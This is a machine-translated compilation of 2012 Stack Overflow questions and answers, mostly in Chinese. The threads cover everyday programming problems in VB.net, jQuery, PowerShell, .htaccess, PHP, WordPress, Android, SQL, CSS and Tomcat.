当我使用特定的网络浏览器打开此网页时，我想自动单击此网页上的“离开 HTML5 试用”或“加入 HTML5 试用”按钮

```
http://www.youtube.com/html5 
```

我最初的想法是将网页嵌入到新的HTML页面中，并在页面加载时使用javascript单击按钮，但似乎无法嵌入

还有其他想法吗？谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T00:09:38.610

如果 JavaScript 允许你这样做，那就太糟糕了。考虑安全隐患。例如，如果恶意网站嵌入了 Facebook iframe，然后模拟您单击该 iframe 中的某个位置，它可能会迫使您不情愿地采取您不知道的操作。

你不可以做这个。

**更新：**

你说你需要编写一些操作脚本。如果您要为您知道 YouTube 登录凭据的特定用户离开/加入 HTML 5 试用版，您可以尝试编写此服务器端的脚本。这可能有点棘手，但是您可以使用 Fiddler 或 Wireshark 之类的工具来捕获手动登录并单击按钮时 HTTP 请求的样子，然后在脚本中模仿这些相同的操作（使用 curl 或 wget 或其他在您的环境中可用）。

# vb.net - 使用 TryCast 返回 DBNull 而不是 Nothing

> ID：13353706
> 
> 赞同：2
> 
> 时间：2012-11-13T00:08:10.293
> 
> 标签：vb.net

我正在尝试在 VB.net 中创建一个简单的函数，它需要一些参数来与 TryCast 一起使用。

我的目标是拥有一个可以用来代替 TryCast 的函数，而不是在失败时返回 Nothing，而是应该返回 DbNull。

尽管进行了很多搜索，但我似乎无法获得任何工作。

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T00:14:06.610

The problem is that you have to have some specific return type for your function. So you can write a function with a signature like this:

```
Public Function TryCast(Of T)(ByVal item As Object) As T 
```

But you will *never* be able to make it do what you want, because the type of `T` is *never* going to be DBNull (okay, maybe it *could* happen, but hopefully you get the idea).

Put another way, the type system blocks this. On the one hand, you want to be perfectly explicit about the return type (hence, the cast). On the other hand, you want to be able to return a completely different type. .Net does not allow this, even with dynamic typing. Either a method returns a *single* fixed type, or it is not declared to return a type at all.

With `Option Explicit` turned off, you might be able to go for something like this:

```
Public Function TryCast(Of T)(ByVal item As Object) 
```

However, I don't think this will do what you want, either, because now the returned value is effectively the same as object, and you lose the benefit of any casting.

It works with the normal TryCast() for `Nothing`, because Nothing can be assigned to any type. DBNull is itself a fixed type, and so is not as flexible.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T01:46:14.177

简单的答案 - 不可能，这就是原因。假设您有以下代码：

```
Class A
End Class
Class B : Inherits A
End Class
Class C
End Class

Private Sub Form1_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
  Dim aaa As A = MyTryCast(Of A)(New B)
  Dim ccc As C = MyTryCast(Of B)(New C)
End Sub

Private Function MyTryCast(Of T As Class)(obj As Object) As Object
  Dim result As Object = TryCast(obj, T)
  If result Is Nothing Then Return Convert.DBNull
  Return result
End Function 
```

`MyTryCast`完全符合您的要求，因此`aaa`分配有效。分配`DBNull`给`ccc`type 的变量时会出现问题`C`。您会期望它分配`DBNull`给`C`，因为`C`无法转换为`B`（常规`TryCast`将返回`Nothing`）。相反，您会得到`System.InvalidCastException`，因为您无法将 a 分配给`DBNull`自定义类的实例。这里要记住的重要事情 -`Nothing`可以分配给任何东西，`DBNull`只能分配给`Object`. 请参阅[此处了解 DBNull 继承层次结构](http://msdn.microsoft.com/en-us/library/system.dbnull.aspx)。

# javascript - 有问题的 jQuery 滚动代码

> ID：13353707
> 
> 赞同：2
> 
> 时间：2012-11-13T00:08:31.897
> 
> 标签：javascript, jquery, html

好的 - 我已将其简化为最简单的形式：

```
<div id="bar>47 px high bar</div>
<div id="header">
    <ul>
        <li>Nav1</li>
    </ul>
</div> 
```

.

```
//Down
$(function() {
    var interval = setInterval(function() {
        if ($(window).scrollTop() >= 47) {
            $("#header").attr("id","header2");
            clearInterval(interval);
        }
    }, 50);
});
//Up
$(function() {
    var interval = setInterval(function() {
        if ($(window).scrollTop() < 47) {
            $("#header2").attr("id","header");
            clearInterval(interval);
        }
    }, 50);
}); 
```

它有效，但*仅限*于一个方向 - 如果我在页面顶部加载它可以向下滚动。如果我加载到页面的一半，它会向上滚动。在此之后转到另一个方向，没有任何反应。有谁知道为什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T00:18:14.253

[阅读 John Resig（jQuery 的创建者）撰写的这篇](http://ejohn.org/blog/learning-from-twitter/)关于缓存和计时器的文章。

```
$(function() {
    var $window = $(window),
        $header = $('#header'),
        scrolled = false;

    $window.scroll(function () {
        scrolled = true;
    });

    setInterval(function() {
        if ( ! scrolled ) return;
        scrolled = false;
        $header.attr('id', $window.scrollTop() < 47 ? 'header' : 'header2');
    }, 50);
}); 
```

* * *

**PS**我不确定你到底想在这里完成什么，但似乎你正试图通过CSS定位标题，在这种情况下你最好切换一个类而不是弄乱id：

```
$header.toggleClass('alternate-header', $window.scrollTop() > 46); 
```

这是小提琴：http: [//jsfiddle.net/6KdQG/](http://jsfiddle.net/6KdQG/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T00:13:52.533

If you clear the interval (clearInterval) what's starting it again, once you scroll back up/down? You have to start it somehow.

You don't need to do it this way. No need for `setInterval`. `window` has a [scroll](https://developer.mozilla.org/en-US/docs/DOM/window.onscroll) event which you can use for this kind of stuff.

An example using the scroll event (jquery)

```
var $window = $(window),
    $header = $('#header');

$window.on('scroll', function () {
    $header.toggleClass('header2', $window.scrollTop() >= 47);
});​ 
```

Here's a [fiddle](http://jsfiddle.net/joplomacedo/cBDhJ/).

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-13T00:22:07.620

我认为您的目标的工作样本：

```
 <!DOCTYPE HTML>
    <html lang="en-US">
    <head>
        <meta charset="UTF-8">
        <title></title>
        <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.2/jquery.min.js"></script>
        <script type="text/javascript">
            var cacheState = $(window).scrollTop(); //detect when scroll has changed
             function downAndUp() {
                if (cacheState != $(window).scrollTop()) {
                    var target = $("li.first").offset().top;
                    if ($(window).scrollTop() >= target) {
                        console.log("Scrolled past li.first");
                        $("#header").addClass("header2");
                        cacheState = $(window).scrollTop();
                    }
                    else {
                        target = $("#bar").outerHeight();
                        if ($(window).scrollTop() <= target) {
                            console.log("Scrolled before li.first");
                            $("#header").removeClass("header2");
                            cacheState = $(window).scrollTop();
                        }
                    }
                }
            } 
            $(document).ready(function(){
                setInterval('downAndUp()',45)
            }); 
        </script>   
        <style type="text/css">
        .header2 {}
        </style>
    </head>
    <body>
    <div id="bar" style="height:300px;">Height:~300px</div>
    <div id="header">
        <ul style="display:block;">
            <li class="first">THIS</li>
            <li>&hellip;</li>
            <li>&hellip;</li>
            <li>&hellip;</li>
            <li>&hellip;</li>
            <li>&hellip;</li>
            <li>&hellip;</li>
            <li>&hellip;</li>
            <li>&hellip;</li>
            <li>&hellip;</li>
            <li>&hellip;</li>
            <li>&hellip;</li>
            <li>&hellip;</li>
            <li>&hellip;</li>
            <li>&hellip;</li>
            <li>&hellip;</li>
            <li>&hellip;</li>
            <li>&hellip;</li>
            <li>&hellip;</li>
            <li>&hellip;</li>
            <li>&hellip;</li>
            <li>&hellip;</li>
            <li>&hellip;</li>
            <li>&hellip;</li>
            <li>&hellip;</li>
            <li>&hellip;</li>
            <li>&hellip;</li>
            <li>&hellip;</li>
            <li>&hellip;</li>       
        </ul>
    </div>
    </body>
    </html> 
```

# powershell - powershell - 在递归复制期间无法排除文件夹

> ID：13353709
> 
> 赞同：5
> 
> 时间：2012-11-13T00:08:45.610
> 
> 标签：powershell

我是 powershell 新手，在递归复制期间尝试排除某些目录时遇到问题。任何帮助表示赞赏！提前致谢。

```
$Date = Get-Date
$Date = $Date.adddays(-1)

$destPath = "\\destination\test"
$srcPath = "H:\program files\symphony\Save"
$srcPathRemits = “H:\program files\symphony\files"
$destDrive = "X:"
$User = "user"
$Password = "password"

$exclude = @('H:\program files\symphony\files\Temp\*','H:\program files\symphony\files\Other\*','H:\program files\symphony\files\etc\*','H:\program files\symphony\files\ParsedXML\*')

$net = new-object -ComObject WScript.Network
$net.MapNetworkDrive($destDrive, $destPath, $false, $User, $Password)

gci -recurse -path $srcPathRemits -Exclude $exclude | ? {!($_.psiscontainer) -AND $_.lastwritetime -gt $Date} | %  { write-host $_.fullname; Copy-Item -path $_.fullname -destination $destDrive} 
$net.RemoveNetworkDrive($destDrive,"true","true") 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-13T01:44:04.147

你没有说问题是什么，但我会假设目录 ( `$exclude`) 没有被正确排除。试试这个，换`gci`行：

```
Get-Item -Path H:\program files\symphony\files\* -Exclude Temp, Other, etc, ParsedXML | Get-ChildItem -recurse | ? {!($_.psiscontainer) -AND $_.lastwritetime -gt $Date} | %  { write-host $_.fullname; Copy-Item -path $_.fullname -destination $destDrive} 
```

# .htaccess - 重写规则导致循环

> ID：13353711
> 
> 赞同：2
> 
> 时间：2012-11-13T00:08:51.753
> 
> 标签：.htaccess, mod-rewrite, rewrite

我们有一个带有欢迎页面的在线商店。我们的 SEO 公司已要求我们通过如下重写来摆脱欢迎页面。我正在努力让它发挥作用。你能帮忙吗？

将 www.domain.co.uk/catalog/index.php 改写为 www.domain.co.uk，然后将 301 从 www.domain.co.uk/catalog/index.php 改写为 www.domain.co.uk。

我有以下代码导致重定向循环并且没有显示任何内容

```
RewriteRule ^/?$ catalog/index.php [L]
Redirect 301 /catalog/index.php http://www.domain.co.uk 
```

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T08:19:46.530

怎么样？

```
RewriteCond %{REQUEST_URI} /catalog/
RewriteRule .* / [L,R=301]

RewriteRule ^/?$ catalog/index.php [L] 
```

如果*目录*是浏览器请求的一部分，则 301 将正确*重定向*到 /，而 / 又将*重写*为 catalog/index.php。

# google-analytics - 使用 Google Analytics 跟踪产品的 Web 界面

> ID：13353712
> 
> 赞同：4
> 
> 时间：2012-11-13T00:08:58.190
> 
> 标签：google-analytics, analytics, web-analytics, adobe-analytics

我的公司生产的硬件产品销往世界各地。他们有一个嵌入式网络服务器，允许用户通过网络界面配置产品。我想增强这个界面的用户体验，第一步是开始收集关于用户如何在整个工具中移动的分析。

我的问题是我应该如何做到这一点，因为不会有域，而是一些用于访问产品的内部 IP 地址。例如，如果他们的 IT 团队将打印机安装在 10.10.10.10 上，他们几乎不会将其与内部服务器名称相关联，并且用户将通过直接点击 IP 来访问 Web 配置工具。即使他们确实创建了像“config.productname.com”这样的内部服务器名称，我也无法知道那会是什么。

这意味着我无法在 GA 中创建配置文件来开始接受此分析数据。过去有没有人做过类似的事情或对如何解决这个问题有建议？

是否可以改用 SiteCatalyst 来解决问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-05T00:50:04.287

SiteCatalyst 提供了将访问者信息存储在您选择的任何 cookie 中的功能，并且不关心您将代码放置在哪个域上。最终，所有数据都会发送到 2o7.net 的子域，但是您可以创建 CNAME 记录，以便您的站点存储 cookie 并将其写入您选择的任何域。

在 s_code.js 文件中，定义了一个变量来管理设置 cookie 的域：

```
s.trackingServer="yourorganizationname.2o7.net"; 
```

无论此实现从何处跟踪数据，它们都将使用完全相同的 cookie 位置，并且无论他们查看哪个域，都将被视为同一个访问者。请记住，这被定义为第三方 cookie，并且一小部分浏览器默认拒绝第三方 cookie。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-13T00:42:41.070

您可以尝试[Piwik](http://piwik.org/)或[Open Web Analytics](http://www.openwebanalytics.com/)，因为您可以将它们部署在自己的基础架构上，并且可以修改它们以满足您的要求。

如果您在制造过程中为每个设备分配了一个序列号，则无论您使用哪种分析工具，您都可能希望使用该序列号来区分设备。

请注意，据我所知，Google Analytics 实际上并不关心您将代码放在哪个域上。他们只是使用您的域规范来确定跟踪 cookie 将被传送到哪些站点。这可能对您没有帮助，因为您可能希望跟踪 cookie 工作，但我指出它以防万一它变得有用......

# performance - 拖动 UIView 作为 UITableView 的子视图滞后于手指

> ID：13353715
> 
> 赞同：1
> 
> 时间：2012-11-13T00:09:14.523
> 
> 标签：performance, uitableview, drag, long-press

我设计了一个 UITableView 的自定义子类。在使用它的某个时候，我需要添加一个 UIView 作为 UITableView 的直接子视图，用我的手指将它拖到表格视图中，然后从表格视图中删除它。我使用 UILongPressGestureRecognizer 以与 iOS 日历应用程序非常相似的方式创建视图，通过重置其框架将其拖到 tableview 周围，然后通过将其添加到单元格中将其从 table view 中删除。

这有效，但有一个警告。当我的手指移动得太快时，我会“失去对 UIView 的控制”，除非我将手指移回视图框架内以再次“拾起”它，否则它不会追上我的手指。

由于 UITableView 是 UIScrollView 的子类，我尝试将 table view 的 delaysContentTouchs 和 canCancelContentTouches 属性设置为 NO，同时将被拖动的 UIView 的 ExclusiveTouch 属性设置为 YES。没有任何效果。

最终，我希望能够以与内置 iOS 日历应用程序一样多的响应能力在表格视图中拖动我的 UIView。有什么想法吗？

PS我对iOS开发比较陌生，所以如果这里有一些重大疏忽，请原谅。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T20:08:27.087

问题解决了！事实证明，设置本身没有任何问题（将子视图添加到 UITableView 并拖动）。

经过大量挖掘，我发现每次将视图拖动到新坐标时，我都在执行一次 hitTest。人们可以看到每秒执行如此密集的操作如何会减慢设备上的处理速度，从而导致这种奇怪的行为。当我改变它时，一切都很完美。

最终，要吸取的教训是我的视图控制器子类太复杂，因此不易阅读。发现这个问题需要进行太多的挖掘。从那以后，我煞费苦心地简化我的代码——这让我受益匪浅。

# php - 如何使用 PHP 从非匿名 FTP 上的远程 zip 存档中提取单个文件？

> ID：13353721
> 
> 赞同：0
> 
> 时间：2012-11-13T00:09:50.997
> 
> 标签：php, ftp, zip

我正在尝试找到用 PHP 实现的解决方案，以从存储在非匿名 FTP 上的 zip 存档中提取单个文件。

问题是：我不能使用像“ [ftp://user:pass@www.domain.com/archive.zip](ftp://user:pass@www.domain.com/archive.zip) ”这样的 FTP URL 来创建一个可以处理剩余任务的有效 ZipArchive 对象。（我用本地档案对此进行了测试。）

我还尝试使用 Phar 扩展和 File_Archive 包 - 无济于事。

[Java 似乎提供了一种解决方案](https://stackoverflow.com/questions/3125841/how-to-extract-a-single-file-from-a-remote-archive-file)，但有问题的服务器只运行 PHP。

你们中的任何人有其他方法来解决这个问题吗？

提前感谢您的帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T03:22:55.703

如果您可以安装 Pecl 库[zip](http://pecl.php.net/package/zip)，那么您应该能够使用函数[zip_open()](http://au1.php.net/manual/en/function.zip-open.php)和[zip_entry_read](http://au1.php.net/manual/en/function.zip-entry-read.php)来做您想做的事情。

# mootools - slimbox 将 DOM 包装在一个 var 中 -

> ID：13353724
> 
> 赞同：0
> 
> 时间：2012-11-13T00:10:34.043
> 
> 标签：mootools

我已经安装了运行良好的 Slimbox。

然而，Slimbox 作者已经封装了所有 Slimbox 代码，并在设置一些全局变量后，在 var 中初始化 DOM。

```
var Slimbox = (function() {

// Global variables, accessible to Slimbox only
var win = window, ie6 = Browser.ie6, options, images, activeImage = -1, activeURL, prevImage, nextImage, compatibleOverlay, middle, centerWidth, centerHeight,

// Preload images
preload = {}, preloadPrev = new Image(), preloadNext = new Image(),

// DOM elements
overlay, center, image, sizer, prevLink, nextLink, bottomContainer, bottom, caption, number,

// Effects
fxOverlay, fxResize, fxImage, fxBottom;

// now initialize the DOM
window.addEvent('domready', function() {

// *************
// This is where the problem arises. 
// I call ajax actions here, and some functions which are external to 'domready' 
// *************
pageInit();
setupFormSubmit('product_bid', 'afterPlaceBid');
setupAjaxAction('delete_validate_id_link', 'afterDelete');
setupAjaxAction('move_validate_down_link', 'afterMoveValidate');
//etc...

});
// end the DOM function

function afterMoveValidate(){  
}

function afterDelete() { 
}

// all the Slimbox functions are here too... 
etc..

//end the var Slimbox
}) 
```

问题是我的外部函数虽然仍在 var 中，但没有全局范围，而 Slimbox 函数却有。

这在没有 Slimbox 的情况下确实有效，我在其中初始化了 DOM 并具有外部函数。

任何人都可以提供想法/解释吗？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T21:32:10.610

slimbox 的作者所做的就是实现了模型模式。如果您测试下面的代码，您会注意到您无法访问`privateVar`或`privateFunction`从外部访问。但是，您可以通过`publicVar``publicFunction.

因此，放入 slimbox 函数（或下面的模型模式）中的所有内容都无法从外部访问，只能从返回的对象中“导出”的部分访问。因为只有那部分会在“slimbox”变量（或下面的模型模式）中。

```
var modelPattern = (function() {

    // Global variables, accessible to Slimbox only
    var privateVar = 'private';

    function privateFunction() {
        console.log(privateVar);
    }

    return {
        publicVar: 'public',
        publicFunction: function() {
            console.log(privateVar);
        }
    };
})();

modelPattern.publicFunction();
if (!modelPattern.privateFunction) {
    console.log("privateFunction is not defined");
}​ 
```

您可以在这个小提琴中看到代码的结果，只需启动您的 javascript 控制台，您就可以看到输出。[http://jsfiddle.net/ArE2x/](http://jsfiddle.net/ArE2x/)

# ruby-on-rails - 如何在发布新的 Ruby 或 Rails 版本时收到通知？

> ID：13353728
> 
> 赞同：5
> 
> 时间：2012-11-13T00:10:57.130
> 
> 标签：ruby-on-rails, ruby

任何人都知道在发布新版本的 Ruby 和 Rails 时收到电子邮件的方法吗？他们有邮件列表，Ruby on Rails 有一个推特，但我不想要那些随之而来的噪音，我只想知道什么时候发布新版本，尤其是那些带有安全修复的版本。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-13T00:14:17.413

[从rails 博客](http://weblog.rubyonrails.org/)获取提要。[http://weblog.rubyonrails.org/feed/atom.xml](http://weblog.rubyonrails.org/feed/atom.xml)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-07-07T12:40:49.420

在 VersionEye 关注 Rails，您将在下一个版本发布时收到一封电子邮件。

[http://www.versioneye.com/ruby/rails/4.0.0](http://www.versioneye.com/ruby/rails/4.0.0)

并且您可以自定义您自己的 RSS 源以获取有关新版本的通知。目前您可以关注超过 220K 的开源项目。

顺便一提。我在 VersionEye 工作。如果您有任何问题，请告诉我 ;-)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-13T01:07:35.487

你可以试试这个服务： http: [//gemnotifier.org/](http://gemnotifier.org/)

每当发布特定 gem 的新版本时，它都会向您发送一封电子邮件。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-13T00:14:48.353

您最好的选择是[订阅 ruby​​onrails-security](https://groups.google.com/forum/?fromgroups#!forum/rubyonrails-security)。还有[ruby​​onrails-talk](https://groups.google.com/forum/?fromgroups#!forum/rubyonrails-talk)，但噪音更大。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-13T07:57:04.660

您可以将 IFTTT 与“RSS 到电子邮件”一起使用

我分享了一个食谱：

[https://ifttt.com/recipes/66069](https://ifttt.com/recipes/66069)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-07-07T13:18:54.357

[**Gemnasium**](https://gemnasium.com/)是一个很好的在线工具来监控你的项目依赖。您可以同步您的 Github 存储库或上传您想要监控的依赖项的项目的 Gemfile。

# wordpress - Wordpress rss 提要作为带有图像/永久链接的帖子类型

> ID：13353734
> 
> 赞同：1
> 
> 时间：2012-11-13T00:11:27.720
> 
> 标签：wordpress, rss

我有一个朋友写了几个不同的博客，想从一个不太受欢迎的博客中提取故事，到他的主博客上，并带有一个 rss 提要并显示其中的图像（因为 rss 提要有时有图像） .

显示 rss 提要不应该太难，它使它们成为一种对我来说似乎更难的自定义帖子类型。

如果有人有任何想法，请拍摄。

编辑：- 有谁知道如何让外部 rss 提要在 wordpress 中显示为自定义帖子类型？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-13T08:20:53.647

一个简单的方法可能是使用 Wordpress 自己的`fetch_feed`功能： [http ://codex.wordpress.org/Function_Reference/fetch_feed](http://codex.wordpress.org/Function_Reference/fetch_feed)

一个简单的示例（假设您已经设置了自定义帖子类型）：

```
function import_feed_items()
{
  $feed = fetch_feed('http://feeds.bbci.co.uk/news/uk/rss.xml');

  if( !is_wp_error($feed) )
  {

    if( $last_import = get_option('last_import') )
    {
      $last_import_time = $last_import;
    } else {
      $last_import_time = false;
    }

    $items = $feed->get_items();
    $latest_item_time = false;

    foreach ( $items as $item )
    {

      $item_date = $item->get_date('Y-m-d H:i:s');
      if( $last_import_time && ($last_import_time >= strtotime($item_date)) )
      {
        continue;
      }

      $post = array(
        'post_content'   => $item->get_content(),
        'post_date'      => $item_date,
        'post_title'     => $item->get_title(),
        'post_status'    => 'publish',
        'post_type'      => 'custom_post_type'
      );
      wp_insert_post($post);

      if( strtotime($item_date) > $latest_item_time )
      {
        $latest_item_time = strtotime($item_date);
      }

    }

    if( false !== $latest_item_time )
    {
      update_option('last_import', $latest_item_time);
    }

  }
  else
  {
    echo $feed->get_error_message();
  }
}
add_action('wp', 'import_feed_items'); 
```

如果内容中有图像标签，您可以使用 php 的 DomDocument 类来获取 url 并将其上传到您的服务器，以便您可以将其设置为特色图像。

[http://codex.wordpress.org/Function_Reference/wp_insert_attachment](http://codex.wordpress.org/Function_Reference/wp_insert_attachment)

[http://codex.wordpress.org/Function_Reference/set_post_thumbnail](http://codex.wordpress.org/Function_Reference/set_post_thumbnail)

**编辑**

更正了时间戳检查。这个更新的示例使用 'wp' 挂钩来运行，因此您可以更快地看到结果。最好将其设置为 cron 任务。请参阅[http://codex.wordpress.org/Function_Reference/wp_schedule_event](http://codex.wordpress.org/Function_Reference/wp_schedule_event)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-12-04T00:55:49.643

[Feed to Post](http://www.wprssaggregator.com/extension/feed-to-post/)插件是将多个 RSS 项目导入 WordPress 博客的完美解决方案，您甚至可以将它们存储为帖子或自定义帖子类型。

[http://www.wprssaggregator.com/extension/feed-to-post/](http://www.wprssaggregator.com/extension/feed-to-post/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-13T00:33:48.097

不幸的是，我不知道有什么办法，但是您是否考虑过修改插件？周围有大量的内容管理插件（feedwordpress、autoblog 等）。您可能会在`wp_insert_post()`某处找到该行并对其进行修改以包含您的自定义帖子类型/分类法。

**编辑** 自己跳进插件（feedwordpress），所有的`insert_post`东西都在里面`syndicatedpost.class.php`——第`wp_insert_post()`1538行的主要内容

**编辑**如果您在阅读该插件代码时喜欢傻笑，您会发现很多*f 字*的实例......哈哈

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-13T00:57:43.717

嘿，为什么不试试这个[http://wordpress.org/extend/plugins/display-latest-rss-feeds/](http://wordpress.org/extend/plugins/display-latest-rss-feeds/) 它会从任何帐户中提取 rss 源并将其显示到您的博客。不幸的是，它不会仅显示 rss 提要标题及其指向原始博客的永久链接的图像，但您可以根据需要轻松修改源代码。

# java - 如何获取从 Internet 获取的 Drawable 并将其保存到我的 Android 设备的缓存目录中？

> ID：13353735
> 
> 赞同：3
> 
> 时间：2012-11-13T00:11:29.470
> 
> 标签：java, android, eclipse, drawable, android-file

这是我的代码...您将看到我要将其保存`Drawable d`到该位置的`File f`位置：

```
 ImageView imgView = (ImageView)header.findViewById(R.id.imvCover);
    File cacheDir = this.getCacheDir();
    File f = new File(cacheDir, itemDict.get("Barcode") + ".jpg");
    if (f.exists())
    {
        Bitmap bmp = BitmapFactory.decodeFile(f.getAbsolutePath());
        imgView.setImageBitmap(bmp);
    }
    else
    {
        String url = (String)itemDict.get("imageURL");
        InputStream is = null;
        try {
            is = (InputStream) new URL(url).getContent();
        } catch (MalformedURLException e) {
            e.printStackTrace();
        } catch (IOException e) { 
            e.printStackTrace();
        }

        Drawable d = Drawable.createFromStream(is, "src");
        if (d != null)
        {
            imgView.setImageDrawable(d);

            // TODO: save the drawable into the cache directory
        }
        else
        {
            imgView.setImageResource(R.drawable.cam);
        }
    } 
```

如何将 Drawable 保存为 .jpg？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-13T00:21:53.293

使用[`Bitmap.compress(...)`](http://developer.android.com/reference/android/graphics/Bitmap.html#compress%28android.graphics.Bitmap.CompressFormat,%20int,%20java.io.OutputStream%29)，像这样：

```
try {
   bitmap.compress(Bitmap.CompressFormat.PNG, 100, new FileOutputStream("/someLocation/someFileName.jpg"));
} catch (Exception e) {
   //TODO: Handle exception
} 
```

有关如何获取缓存目录路径的示例，请参见此 SO 答案：

[android-download-images-from-server-and-save-them-on-device-cache](https://stackoverflow.com/questions/8103729/android-download-images-from-server-and-save-them-on-device-cache)

这从转换`Drawable`为`Bitmap`：

[如何将可绘制的位图转换为位图](https://stackoverflow.com/questions/3035692/how-to-convert-a-drawable-to-a-bitmap)

# sql - SQL：这个问题是否需要相同的两个表之间的两个多对多关系？

> ID：13353737
> 
> 赞同：0
> 
> 时间：2012-11-13T00:11:42.720
> 
> 标签：sql, database

我正在处理一个家庭作业问题。

我得到以下实体：公司、开业、资格、候选人、工作历史、实习、课程和会议。

*   每门课程都会发展一种特定的资格；但是，TEC 并不为所有资格提供课程。一些资格是通过多门课程发展起来的。
*   一些课程涵盖需要特定资格作为先决条件的高级主题。一些课程涵盖不需要任何先决条件的基本主题。一门课程可以有几个先决条件。资格可以是多门课程的先决条件。

这听起来不像是 COURSE 和 QUALIFICATION 之间的两种不同的多对多关系吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T00:20:03.473

先决条件要求是多对多关系。

但是，每个资格都可以通过多门课程培养，并不意味着任何课程都可以培养多个资格。事实上，你具体说每门课程只培养一个资格。所以这不是多对多的关系。

这是多对一的。也就是说，COURSE 包含引用 QUALIFICATION 的列。因此，每门课程只有一个资格。但是 COURSE 中的多行可能引用相同的 QUALIFICATION，它仍然是多对一的。

# javascript - jQuery 属性选择器无法识别的表达式错误

> ID：13353739
> 
> 赞同：1
> 
> 时间：2012-11-13T00:11:58.533
> 
> 标签：javascript, jquery

我正在使用以下代码从导航无序列表中选择当前页面的列表项，但我不断收到无法识别的表达式错误`'a[href$="{server-relative URL}"]'`

我已经检查了其他问题提到的匹配引号/括号，并且链接不会包含超出通常的字符`/ & ? %`我正在使用的代码是：

```
$(document).ready(function() {
    var pathname = window.location.pathname;
    var selector = "'a[href$=\"" + pathname + "\"]'";
    var listItem = $(selector).parent().parent();
    listItem.addClass('selected');
}); 
```

我正在使用 jQuery 1.8.2（最新版本）。谢谢！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-13T00:15:37.863

问题是您将选择器括在单引号中。只需更改此行：

```
var selector = "'a[href$=\"" + pathname + "\"]'"; 
```

...对此：

```
var selector = 'a[href$="' + pathname + '"]'; 
```

# html - Selected/Current State for Navigation Menu

> ID：13353741
> 
> 赞同：-1
> 
> 时间：2012-11-13T00:12:10.287
> 
> 标签：html, css, hover

I've created my navigation menu using CSS and an image sprite for the rollover states (i.e hover, active). However, I'm trying to create a 'selected/current' state (which in my case is the same as the active state) so that dependent on the page you've selected, the corresponding navigation button is highlighted. Here's what I have:

CSS:

```
#menu li {
margin: 0;
padding: 0;
height: 50px;
list-style: none;
display: inline;
float: left;
line-height: 40px;
}

#menu a {
display: block;
height: 50px;
}

#menu a:hover {
background-image:url(../Images/about_rollover.gif)
}

#about {
width: 90px;
}

#about a:hover {
background-position: 0 -50px;
}

#about a:active {
background-position: 0 -100px;
}

#about a:selected {
background-position: 0 -100px;
}

#portfolio {
width: 90px;
}

#portfolio a:hover {
background-position: 90px -50px;
}

#portfolio a:active {
background-position: 90px -100px; 
```

HTML:

```
<ul id="menu">
    <li id="about"><a href"#"></a></li>
    <li id="portfolio"><a href="portfolio.html"></a></li>
</ul> 
```

Image sprite: [view here](http://i875.photobucket.com/albums/ab313/jamiepaulsmith/about_rollover.gif)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T00:27:58.687

解决此问题的一种方法是将一个类放在标识您当前正在浏览的页面的主体标签上，并在导航项属于该特定类时将选定状态应用于导航项。喜欢：

HTML：

```
<body class="about">
    <ul id="menu">
        <li id="about"><a href=... 
```

CSS：

```
body.about ul li.about { [selected background position] } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-13T00:30:24.453

**第一：**
您在服务器级别使用某种语言来实现站点？
如果是这样，检查被选中的页面并添加一个特定的类来标记它会很有趣，例如（通过 php）：

```
<ul id="menu">
<li id="about"<?php echo $accessedPage == 'about' ? ' class="selected"' : ''; ?>><a href"#"></a></li>
<li id="portfolio"><a href="portfolio.html"></a></li>
</ul> 
```

**第二：**
您可以将css选择器分组以悬停并选中：

```
#about a:hover,
#about .selected a {
    background-position: 0 -50px;
}

#portfolio a:hover,
#portfolio .selected {
    background-position: 90px -50px;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-13T00:22:07.307

您将需要查看某些类型的应用程序逻辑的当前路径，而不是严格的 CSS。

例如，您可以使用 javascript：

```
$('document').ready(function () {

    //Gets the current window location
    var currentPath = window.location.pathname;

    /*Logic to identify where the user is relative
    to your webpage and update the style*/
    if (currentPath = '/portfolio')
    {
        $('portfolio').addclass('menuactive');
    }
}); 
```

您必须添加类来定义不同菜单项的状态。但这应该让你朝着正确的方向前进。

# tomcat - 每当我安装新的war文件时，Tomcat下载文件夹都是空的

> ID：13353743
> 
> 赞同：1
> 
> 时间：2012-11-13T00:12:14.657
> 
> 标签：tomcat, web-applications, war

我对 Tomcat 的了解足以对自己和他人造成危险。

为了部署，我创建了一个 WAR 文件（从 Eclipse 导出），然后将该 WAR 文件复制到 \apache-tomcat-7.0.23\webapps\ 文件夹，然后使用 \apache-tomcat-7.0.23\bin\startup 重新启动。蝙蝠。

